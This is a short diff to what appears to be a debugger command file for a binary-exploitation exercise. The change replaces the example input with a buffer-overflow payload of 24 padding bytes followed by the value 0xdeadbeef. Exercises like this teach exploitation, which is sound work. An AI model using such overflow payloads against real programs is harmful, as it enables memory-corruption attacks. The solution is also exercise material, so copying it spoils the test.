@@ -1,5 +1,6 @@
 # Edit this file and type your solution where indicated, the code below is just an example
-run $(python -c "print 'A'*4 + '\x11\x11\x11\x11'")
+
+run $(python -c "import sys; sys.stdout.write('A'*16 + 'A'*8 + '\xef\xbe\xad\xde')")
 
 # Leave the code below in place
 quit
